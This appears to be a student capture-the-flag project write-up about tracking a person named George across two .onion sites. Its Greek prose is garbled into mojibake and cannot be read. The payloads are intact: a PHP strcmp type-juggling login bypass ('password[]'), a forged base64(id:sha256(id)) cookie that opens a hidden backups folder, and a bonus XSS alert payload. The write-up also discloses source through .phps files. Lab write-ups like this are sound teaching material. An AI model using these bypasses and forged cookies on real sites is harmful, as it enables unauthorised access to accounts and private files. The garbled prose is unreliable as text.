# 2020-project-2-cybergh0sts

## &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; Part 1 (_Finding George_)

1. Î‘ÏÏ‡Î¹ÎºÎ¬, Î²ÏÎ®ÎºÎ±Î¼Îµ Î¼Îµ **View Page Source**, Ï„Î¿ ÏƒÏ‡ÏŒÎ»Î¹Î¿ Ï€Î¿Ï… Ï€ÎµÏÎ¹ÎµÎ¯Ï‡Îµ Ï„Î¿ blog Î¼Îµ Ï„ÏÏŒÏ€Î¿Ï…Ï‚ Î±ÏƒÏ†Î¬Î»Î¹ÏƒÎ·Ï‚ ÎµÎ½ÏŒÏ‚ server

   > --> Link: https://blog.0day.rocks/securing-a-web-hidden-service-89d935ba1c1d

<br/>

2. Î‘Ï€ÏŒ ÎµÎºÎµÎ¯ Î²ÏÎ®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ **/server-info** Î³Î¹Î± Î½Î± Î´Î¿ÏÎ¼Îµ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ 
   ÏƒÏ‡ÎµÏ„Î¹ÎºÎ­Ï‚ Î¼Îµ Ï„Î¿Î½ server

   > --> Link: http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/server-info
    
<br/>
    
3. ÎˆÏ„ÏƒÎ¹, Î¼Î­ÏƒÎ± ÏƒÏ„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î±Ï…Ï„Î­Ï‚, Î²ÏÎ®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ ÏƒÏ„Î¿ server ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„Î¿ÏÎ½Ï„Î±Î¹ Î´ÏÎ¿ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´ÎµÏ‚ ÎºÎ±Î¹ Ï€Î®ÏÎ±Î¼Îµ Ï„Î¿ 2<sup>Î¿</sup> .onion link

    > ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/1-Served_Links.png) 
    >
    >
    > --> Link: http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/

<br/>

4. ÎœÎµÏ„Î¬ Î±Ï€ÏŒ Ï„Î¿ **/server-info** Î¾Î±Î½Î¬, Ï„Î¿Ï… 2<sup>Î¿Ï…</sup> onion, Î²ÏÎ®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ Î­Ï‡Î¿Ï…Î¼Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÏŒÎ»Î± Ï„Î± **.phps** files

   > ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/2-Extensions_Granted_Access.png)
    
   Î Î±ÏÏŒÎ¼Î¿Î¹Î± Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯Î± Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Ï€Î¬ÏÎ¿Ï…Î¼Îµ ÎºÎ±Î¹ Î¼Îµ Î±ÎºÏŒÎ¼Î± Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿. ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿ **/robots.txt** Î±Î½Î±Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ Ï„Î¿ ÎµÎ¾Î®Ï‚
   
   > Disallow: /\*.phps
   
   Ï€Î¿Ï… Î´Î·Î»ÏÎ½ÎµÎ¹ ÏŒÏ„Î¹ Î¿ server Î´Îµ Î¸Î­Î»ÎµÎ¹ Ï„Î± Web Robots Ï€Î¿Ï… Î¸Î± Î´Î¹Î±Î²Î¬ÏƒÎ¿Ï…Î½ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿, Î½Î± ÎµÏ€Î¹ÏƒÎºÎµÏ†Î¸Î¿ÏÎ½ ÏƒÎµÎ»Î¯Î´ÎµÏ‚ Î¼Îµ ÎºÎ±Ï„Î¬Î»Î·Î¾Î· **.phps**.
   Î‘Ï…Ï„ÏŒ Î¬Î¼ÎµÏƒÎ± Î¼Î±Ï‚ Î´Î·Î»ÏÎ½ÎµÎ¹ ÏŒÏ„Î¹ ÎºÎ¬Ï€Î¿Ï… ÏƒÏ„Î¿ server ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î½Î± Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹Î¿ php source file, Î±Ï€ÏŒ Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î´Î¿ÏÎ¼Îµ Ï„Î¿ 
   back end Ï„Î·Ï‚ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î·Ï‚ ÏƒÎµÎ»Î¯Î´Î±Ï‚. [<sup>[1]</sup>](#1--httpswwwrobotstxtorgrobotstxthtml)

<br/>

5. ÎœÎµÏ„Î¬, Ï€Î±Ï„ÏÎ½Ï„Î±Ï‚ Ï„Î¿ _Submit_ Ï€Î¿Ï… ÎµÎ¯Ï‡Îµ ÏƒÏ„Î· Ï†ÏŒÏÎ¼Î±, Î¼Î±Ï‚ Î±Î½Î±ÎºÎ±Ï„ÎµÏÎ¸Ï…Î½Îµ ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î± **/access.php** Î¼Îµ Î¼Î®Î½Ï…Î¼Î± Î»Î¬Î¸Î¿Ï…Ï‚. 
   
   <ul>
   <li>Î‘ÏÏ‡Î¹ÎºÎ¬ ÏƒÎºÎµÏ†Ï„Î®ÎºÎ±Î¼Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎ¿Ï…Î¼Îµ Î¼Îµ <b>SQL Injection</b> Î½Î± Î±Î½Ï„Î»Î®ÏƒÎ¿Ï…Î¼Îµ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î±Ï€ÏŒ Ï„Î· Î²Î¬ÏƒÎ·.</li>
   <li>Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÎµÏ†ÏŒÏƒÎ¿Î½ ÎµÎ¯Î´Î±Î¼Îµ ÏŒÏ„Î¹ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÎºÎ¬Î½Î¿Ï…Î½Î¼Îµ ÎºÎ¬Ï„Î¹ Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ attack, ÏˆÎ¬Î¾Î±Î¼Îµ ÏƒÏ„Î¿ <b>/server-info</b> Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… 
      onion ÎºÎ±Î¹ Î²ÏÎ®ÎºÎ±Î¼Îµ Î±Ï…Ï„Î¬ Ï€Î¿Ï… Î±Î½Î±Ï†Î­ÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿ 4.</li>
   <li>Î¤ÏŒÏ„Îµ, Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎ±Î¼Îµ Î½Î± Î²Î¬Î»Î¿Ï…Î¼Îµ ÏƒÏ„Î¿ url Ï„Î¿ <b>access.phps</b> ÎºÎ±Î¹ Î¼Î±Ï‚ ÎµÎ¼Ï†Î¬Î½Î¹ÏƒÎµ Ï„Î¿ source code Ï„Î¿Ï….</li>
   </ul><br/>
   
   > &emsp;&nbsp;&nbsp; --> Link: http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.phps
   
<br/>

6. Î”Î¹Î±Î²Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î²ÏÎ®ÎºÎ±Î¼Îµ Ï€ÏÏ‚ Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Ï„Î¿ <b>username</b>. Î¦Ï„Î¹Î¬Î¾Î±Î¼Îµ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ script Ï€Î¿Ï… Ï„Î¿ Ï…Ï€Î¿Î»ÏŒÎ³Î¹Î¶Îµ ÎºÎ±Î¹ Î²ÏÎ®ÎºÎ±Î¼Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® 
   Ï„Î¿Ï… $user (= 1337) \[leet ğŸ˜‰\]
   
   ```python
   cnt = 0
   i   = 0
   while True:
       if '7' in list(str(i*7)):
           cnt = cnt + 1

       if cnt == 48:
           print(i*7)
           break

       i = i + 1
   ```
   Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÎµÎ¯Î´Î±Î¼Îµ ÏŒÏ„Î¹ Î­Ï‡ÎµÎ¹ ÎºÎ±Î¹ Î­Î½Î±Î½ 2<sup>Î¿</sup> ÎµÎ»ÎµÎ³Ï‡Î¿ Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎ¿Ï…Î¼Îµ. ÎˆÏ€ÏÎµÏ€Îµ Ï„Î¿ Î¼Î®ÎºÎ¿Ï‚ Ï„Î¿Ï… username Î½Î± ÎµÎ¯Î½Î±Î¹ Î¯ÏƒÎ¿ Î¼Îµ 
   **7**. ÎˆÏ„ÏƒÎ¹ Î±Ï€Î»Î¬ Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎ±Î¼Îµ **3** Ï‡Î±ÏÎºÎ±Ï„Î®ÏÎµÏ‚ + Î¿Î¹ Î¿Ï€Î¿Î¯Î¿Î¹ Î±Î³Î½Î¿Î¿ÏÎ½Ï„Î±Î¹ ÎºÎ±Î¹ Ï€ÎµÏÎ¬ÏƒÎ±Î¼Îµ Ï„Î¿Î½ Ï€ÏÏÏ„Î¿ Î­Î»ÎµÎ³Ï‡Î¿.
   
   <h6> <i> Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·: ÎŸÏ€Î¿Î¹Î¿Ï…ÏƒÎ´Î®Ï€Î¿Ï„Îµ 3 Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ ÎºÎ±Î¹ Î½Î± Î²Î¬Î»Î¿Ï…Î¼Îµ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î³ÏÎ¬Î¼Î¼Î±Ï„Î± ÎºÎ±Î¹ ÏŒÏ‡Î¹ ÏˆÎ·Ï†Î¯Î± Ï€ÎµÏÎ½Î¬Î¼Îµ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿. </i> </h6>

<br/>

7. ÎœÎµÏ„Î¬ ÎµÎ¯Î´Î±Î¼Îµ ÏŒÏ„Î¹, Î³Î¹Î± Î½Î± Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Ï„Î¿ $password, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¼Î¹Î± **strcmp()**, Ï„Î·Ï‚ Î¿Ï€Î¿Î¯Î±Ï‚ Ï„Î¿ Î­Î½Î± ÎµÎº Ï„Ï‰Î½ Î´ÏÎ¿ Î¿ÏÎ¹ÏƒÎ¼Î¬Ï„Ï‰Î½ Ï„Î¿ 
   ÎµÎ»Î­Î³Ï‡Î¿Ï…Î¼Îµ ÎµÎ¼ÎµÎ¯Ï‚. 
   
   Î‘ÎºÏŒÎ¼Î±, Î¿ Î­Î»ÎµÎ³Ï‡Î¿Ï‚ Ï€Î¿Ï… ÎºÎ¬Î½ÎµÎ¹ Î· php Î³Î¹Î± Ï„Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Ï„Î·Ï‚ `strcmp()`, ÎµÎ¯Î½Î±Î¹ **loose comparison (!=)** ÎºÎ±Î¹ ÏŒÏ‡Î¹ **strict (!==)**, 
   Ï€Î¿Ï… ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸ÎµÎ¯ Ï€Î¿Î»Ï Ï€Î¹Î¿ ÎµÏÎºÎ¿Î»Î±. Î‘ÎºÎ¿Î»Î¿ÏÎ¸Ï‰Ï‚ Ï€Î±ÏÎ±Ï„Î¯Î¸ÎµÎ½Ï„Î±Î¹ Î´ÏÎ¿ Ï€Î¯Î½Î±ÎºÎµÏ‚ Î±Î»Î·Î¸ÎµÎ¯Î±Ï‚ Î³Î¹Î± Ï„Î± Î´ÏÎ¿ ÎµÎ¯Î´Î· ÏƒÏ…Î³ÎºÏÎ¯ÏƒÎµÏ‰Î½.
   
   |  |  |
   |--|--|
   | ![alt_text](https://hydrasky.com/wp-content/uploads/2017/05/strict-comparison.png) | ![alt_text](https://hydrasky.com/wp-content/uploads/2017/05/loose-comparison.png) |
   
   <!-- <h4> <b> Strict Comparison Mode (=== , !===) </b> </h4> -->
   
   <!-- |        | TRUE  | FALSE |   1   |   0   |  -1   |  "1"  |  "0"  | "-1"  | NULL  | array() | "php" |  ""   |
   |--------|-------|-------|-------|-------|-------|-------|-------|-------|-------|---------|-------|-------|
   |**TRUE**    | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |**FALSE**   | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |1       | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |0       | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |-1      | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"1"     | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"0"     | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"-1"    | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE |  FALSE  | FALSE | FALSE |
   |**NULL**    | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  |  FALSE  | FALSE | FALSE |
   |array() | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  **TRUE**   | FALSE | FALSE |
   |"php"   | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | **TRUE**  | FALSE |
   |""      | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | **TRUE**  | -->
   
   <!-- <h4> <b> Loose Comparison Mode (== , !==) </b> </h4> -->
   
   <!-- |        | TRUE  | FALSE |   1   |   0   |  -1   |  "1"  |  "0"  | "-1"  | NULL  | array() | "php" |  ""   |
   |--------|-------|-------|-------|-------|-------|-------|-------|-------|-------|---------|-------|-------|
   |**TRUE**    | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE |  FALSE  | **TRUE**  | FALSE |
   |**FALSE**   | FALSE | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | **TRUE**  |  TRUE   | FALSE | **TRUE**  |
   |1       | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |0       | FALSE | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | **TRUE**  |  FALSE  | **TRUE**  | **TRUE**  |
   |-1      | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE |  FALSE  | FALSE | FALSE |
   |"1"     | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"0"     | FALSE | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"-1"    | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE |  FALSE  | FALSE | FALSE |
   |**NULL**    | FALSE | **TRUE**  | FALSE | ***TRUE***  | FALSE | FALSE | FALSE | FALSE | **TRUE**  |  TRUE   | FALSE | **TRUE**  |
   |array() | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  |  TRUE   | FALSE | FALSE |
   |"php"   | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | **TRUE**  | FALSE |
   |""      | FALSE | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | **TRUE**  |  FALSE  | FALSE | **TRUE**  | -->
   
   ÎŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÎµÏÎºÎ¿Î»Î± Î±Ï€ÏŒ Ï„Î¿ 2<sup>Î¿</sup> Ï€Î¯Î½Î±ÎºÎ±, Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î¿ **type juggling** Ï€Î¿Ï… Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹ÎµÎ¯ Î· php, Ï„Î¿ **NULL** Î³Î¯Î½ÎµÏ„Î±Î¹ evaluated
   Ï‰Ï‚ 0 ÎºÎ±Î¹ Î­Ï„ÏƒÎ¹ Î· ÏƒÏÎ³ÎºÏÎ¹ÏƒÎ· **NULL == 0** ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ ***TRUE***. [<sup>\[2\]</sup>](#2--httpsowasporgwww-pdf-archivephpmagictricks-typejugglingpdfpage33)[<sup>\[3\]</sup>](#3--httpswwwdoylernetsecurity-not-includedbypassing-php-strcmp-abctf2016)
   
   Î†ÏÎ± Î­Ï€ÏÎµÏ€Îµ Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Ï„ÏÏŒÏ€Î¿ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ Ï„Î¿ ÏŒÏÎ¹ÏƒÎ¼Î± Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡Î¿Ï…Î¼Îµ, Î½Î± Î¼ÎµÏ„Î±Ï„ÏÎ±Ï€ÎµÎ¯ ÏƒÎµ **empty array**, ÎºÎ±Î¸ÏÏ‚ Î´Î¯Î½Î¿Î½Ï„Î±Ï‚ ÏƒÏ„Î·Î½ `strcmp()` ÏƒÎ±Î½ 
   ÏŒÏÎ¹ÏƒÎ¼Î± Ï„Î¿Î½ ÎºÎµÎ½ÏŒ Ï€Î¯Î½Î±ÎºÎ±, ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ **NULL**!
   
   ÎˆÏ„ÏƒÎ¹, Î²ÏÎ®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ Î· php Î¼ÎµÏ„Î±Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î± **POST** ÎºÎ±Î¹ **GET** variables Ï„Î·Ï‚ Î¼Î¿ÏÏ†Î®Ï‚ **pass\[\]=**, ÏƒÎµ **Empty Arrays**. 
   
   Î£Ï…Î½ÎµÏ€ÏÏ‚, Ï„Î¿ Î¼ÏŒÎ½Î¿ Ï€Î¿Ï… Ï‡ÏÎµÎ¹Î±Î¶ÏŒÏ„Î±Î½ Î³Î¹Î± Î½Î± ÏƒÏ€Î¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿, Î®Ï„Î±Î½ Î½Î± Î´ÏÏƒÎ¿Ï…Î¼Îµ ÏƒÎ±Î½ paylaod: **password\[\]**
   
   Î†ÏÎ±, Ï„Î¿ Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¼Î­Î½Î¿ payload Ï€Î¿Ï… Ï‡ÏÎµÎ¹Î±Î¶ÏŒÎ¼Î±ÏƒÏ„Îµ Î³Î¹Î± Î½Î± Ï€ÎµÏÎ¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿Ï…Ï‚ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ ÎµÎ¯Î½Î±Î¹: **user=1337+++&password\[\]**
   
   > --> Link: http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.php?user=1337+++&password[]

<br/>

8. ÎœÎµÏ„Î¬ Î±Ï€ÏŒ Ï„Î¿ **/blogposts7589109238** Ï€Î¿Ï… Î¼Î±Ï‚ Î­Î´Ï‰ÏƒÎµ Î· ÎºÎ±Î¹Î½Î¿ÏÏÎ³Î¹Î± ÏƒÎµÎ»Î¯Î´Î±, Ï€Î®Î³Î±Î¼Îµ ÏƒÏ„Î·Î½ **/blogspots** ÎºÎ±Î¹ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… indexing 
   Ï€Î¿Ï… Î´ÎµÎ½ ÎµÎ¯Ï‡Îµ Î±ÏƒÏ†Î±Î»Î¯ÏƒÏ„ÎµÎ¹, Î²ÏÎ®ÎºÎ±Î¼Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **post3.html** Ï€Î¿Ï… Ï€ÎµÏÎ¹ÎµÎ¯Ï‡Îµ Ï„Î·Î½ Ï€ÏÏÏ„Î· Î±Î½Î±Ï†Î¿ÏÎ¬ ÏƒÏ„Î¿Î½ Î“Î¹ÏÏÎ³Î¿ ÎºÎ±Î¹ Î´Î¹Î¬Ï†Î¿ÏÎ± Î¬Î»Î»Î± ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î±.

   > --> Link: http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238/blogposts/

<br/>

9. Î‘Ï€ÏŒ ÎµÎºÎµÎ¯ ÎµÎ¯Î´Î±Î¼Îµ Î½Î± Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ Ï„Î¿ ÎµÎ¾Î®Ï‚: **"Winner Visitor #100013"** ÎºÎ±Î¹ Î¸Ï…Î¼Î·Î¸Î®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ ÎµÎ¯Ï‡Î±Î¼Îµ Î´ÎµÎ¹ Ï„Î¿ **Visitor** ÏƒÎ±Î½ Name ÏƒÏ„Î¿
   cookie Ï„Î·Ï‚ Î±ÏÏ‡Î¹ÎºÎ®Ï‚ ÏƒÎµÎ»Î¯Î´Î±Ï‚ (http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/) Ï€Î¿Ï… Î¼Î±Ï‚ 
   ÎµÎ¯Ï‡Îµ Î´Î¿Î¸ÎµÎ¯ ÎºÎ±Î¹ Ï…Ï€Î¿ÏˆÎ¹Î±ÏƒÏ„Î®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÎºÎ¬Ï€Î¿Ï… ÎµÎºÎµÎ¯.
   
   ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/3-Cookie_Name.png)
    
   Î”Î¹Î±Î³ÏÎ¬Ï†Î¿Î½Ï„Î±Ï‚ Ï„Î¿ cookie Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ ÎºÎ±Î¹ ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ reload ÎµÎ¯Î´Î±Î¼Îµ ÏŒÏ„Î¹ ÏƒÏ„Î· Î¸Î­ÏƒÎ· Ï„Î¿Ï… 204 ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÎ¹ **"Bad sha256"**.
   Î¤ÏŒÏ„Îµ ÏƒÎºÎµÏ†Ï„Î®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ Ï„Î¿ value Ï„Î¿Ï… cookie ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÎ¹ Ï„Î¿ Ï„Î¹ Î¸Î± ÎµÎºÏ„Ï…Ï€Ï‰Î¸ÎµÎ¯ ÏƒÏ„Î· Î¸Î­ÏƒÎ· Ï„Î¿Ï… 204.
   
   ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/4-Cookie_BadSHA256.png)
   
   Î•Î¯Î´Î±Î¼Îµ ÏŒÏ„Î¹ Ï„Î¿ value Ï„Î¿Ï… cookie Ï„ÎµÎ»ÎµÎ¹ÏÎ½ÎµÎ¹ ÏƒÎµ %3D Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Ï„Î¿ (=) ÏƒÎµ URL encoded Î¼Î¿ÏÏ†Î® ÎºÎ±Î¹ Î²ÏÎ®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ
   ÎµÎ¯Î½Î±Î¹ format Ï€Î¿Ï… ÏƒÏ…Î¼Ï†Ï‰Î½ÎµÎ¯ Î¼Îµ Ï„Î·Î½ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· base64. [<sup>\[4\]</sup>](#4--httpsstackoverflowcomquestions6916805why-does-a-base64-encoded-string-have-an-sign-at-the-end)
   
   ÎšÎ¬Î½Î¿Î½Ï„Î±Ï‚ decrypt Ï„Î¿: **MjA0OmZjNTZkYmM2ZDQ2NTJiMzE1Yjg2YjcxYzhkNjg4YzFjY2RlYTljNWYxZmQwNzc2M2QyNjU5ZmRlMmUyZmM0OWE=** \
   ÎµÎ¯Î´Î±Î¼Îµ ÏŒÏ„Î¹ Ï€Î±ÏÎ¬Î³ÎµÎ¹ Ï„Î¿: **204:fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a**
   
   ÎœÎµÏ„Î¬ ÎºÎ¬Î½Î±Î¼Îµ hashing Ï„Î¿Ï… 204 Î¼Îµ Ï„Î¿ sha-256 ÎºÎ±Î¹ ÎµÎ¯Î´Î±Î¼Îµ ÏŒÏ„Î¹ Ï€Î±ÏÎ¬Î³ÎµÎ¹ Ï„Î¿ 2Î¿ ÎºÎ¿Î¼Î¼Î¬Ï„Î¹ Ï„Î¿Ï… decrypted base64.

   Î†ÏÎ± ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î¬ÏƒÎ±Î¼Îµ ÎµÎ½ Ï„Î­Î»ÎµÎ¹ Ï„Î¿ ÎºÎ±Î¹Î½Î¿ÏÏÎ³Î¹Î¿ value Î³Î¹Î± Ï„Î¿ cookie ÏƒÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·: base64( id:sha256(id) )

   ÎˆÏ„ÏƒÎ¹ Ï€Î±ÏÎ¬Ï‡Î¸Î·ÎºÎµ Ï„Î¿: **MTAwMDEzOjM2MjA5NTQyMzYyNzg3ZjIyMDU0MTgyYzNlNDE0MDlmZDFiMDQ4NmVjYjI4MmMwMmRjNTdiNGY5OGU0N2RlNzA=**

   Î’Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ ÏƒÏ„Î¿ cookie, Î»Î¿Î¹Ï€ÏŒÎ½, ÎµÎ¼Ï†Î±Î½Î¯ÏƒÏ„Î·ÎºÎµ Î· ÎºÏÏ…Ï†Î® Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± Ï„Î¿Ï… ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï… Î¼Îµ Ï„Î± backups Î±Ï€ÏŒ Ï„Î¿ ÎºÎ¹Î½Î·Ï„ÏŒ Ï„Î¿Ï… Î“Î¹ÏÏÎ³Î¿Ï… 
   **/sekritbackups2444**.

   > --> Link: http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/sekritbackups2444/
   
   
   #### Bonus!
   
   Î‘ÎºÎ¿Ï…Î»Î¿Ï…Î¸ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î¼Ï€Î¿ÏÎ­ÏƒÎ±Î¼Îµ ÎºÎ±Î¹ ÎºÎ¬Î½Î±Î¼Îµ **XSS attack** ÏƒÏ„Î¿ site.
   
   ÎˆÏ„ÏƒÎ¹, Î¼Îµ payload: **<script\>alert(1)</script\>**, Î¼ÎµÏ„Î±Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î¿ ÏƒÎµ **sha256** ÎºÎ±Î¹ Î¼ÎµÏ„Î¬ ÏƒÎµ **base64**, ÎµÎ¼Ï†Î±Î½Î¯ÏƒÏ„Î·ÎºÎµ Ï„Î¿ alert message
